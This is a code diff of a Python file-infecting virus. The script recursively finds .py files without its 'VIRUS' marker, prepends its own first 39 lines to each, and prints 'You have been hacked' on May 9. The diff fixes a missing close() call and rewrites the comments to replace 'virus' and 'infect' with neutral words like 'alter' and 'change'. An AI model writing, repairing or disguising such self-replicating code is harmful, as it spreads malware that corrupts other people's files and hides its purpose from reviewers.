@@ -8,56 +8,53 @@
 import os
 import datetime
 
-SIGNATURE = "VIRUS"
+SIGNATURE = "VIRUS"  # This is a marker the script uses to identify whether a file has been altered.
 
-# This function recursively searches for Python files that are not already infected.
+# Function to search and list files that are to be altered.
 def locate(path):
-    files_targeted = []
-    filelist = os.listdir(path)
+    files_targeted = []  # Start with an empty list to hold the files that will be changed.
+    filelist = os.listdir(path)  # Get a list of all items in the current directory.
     for fname in filelist:
         if os.path.isdir(path+"/"+fname):
-            # If the item is a directory, it recurses into the directory to find more files.
+            # If the item is a folder, look inside it for more files.
             files_targeted.extend(locate(path+"/"+fname))
         elif fname[-3:] == ".py":
-            # Checks if the file extension is '.py' for Python files.
+            # If the item ends in '.py', it could be a candidate for alteration.
             infected = False
             for line in open(path+"/"+fname):
                 if SIGNATURE in line:
-                    # Looks for the SIGNATURE in the file to determine if already infected.
+                    # If the marker is found, the file has already been altered.
                     infected = True
                     break
-            if infected == False:
-                # If the file is not infected, it adds it to the list of files to target.
+            if not infected:
+                # If the marker isn't found, add the file to the list to be changed.
                 files_targeted.append(path+"/"+fname)
     return files_targeted
 
-# This function is designed to prepend the virus code to the targeted files.
+# Function to alter files.
 def infect(files_targeted):
-    virus = open(os.path.abspath(__file__))
-    virusstring = ""
+    virus = open(os.path.abspath(__file__))  # Open the current script file.
+    virusstring = ""  # Prepare an empty string to store parts of the current file.
     for i,line in enumerate(virus):
         if 0 <= i < 39:
-            # Reads the first 39 lines of its own file - which is the virus code.
+            # Copy the first portion of the script to replicate later.
             virusstring += line
-    virus.close  # Missing parentheses here, it should be virus.close()
+    virus.close()  # Close the opened script file.
     for fname in files_targeted:
-        f = open(fname)
-        temp = f.read()
+        f = open(fname)  # Open each file intended to be altered.
+        temp = f.read()  # Read the original content of the file.
         f.close()
-        f = open(fname,"w")
-        # Prepend the virus code to the original contents of the file.
-        f.write(virusstring + temp)
+        f = open(fname, "w")  # Re-open the file to overwrite it.
+        f.write(virusstring + temp)  # Add the script portion to the original content.
         f.close()
 
-# This function checks the current date and prints a message if it's May 9th.
+# Function to execute an action on a particular date.
 def detonate():
     if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
-        print("You have been hacked")
+        print("You have been hacked")  # Message displayed on a specific date.
 
-# The main part of the script that gets executed:
-# 1. It locates Python files to infect.
-# 2. Infects them with the virus code.
-# 3. Checks the date and potentially detonates the payload (prints a message).
+# The script execution starts here:
+# It first finds files to change, then changes them, and finally checks the date for an action.
 files_targeted = locate(os.path.abspath(""))
 infect(files_targeted)
 detonate()
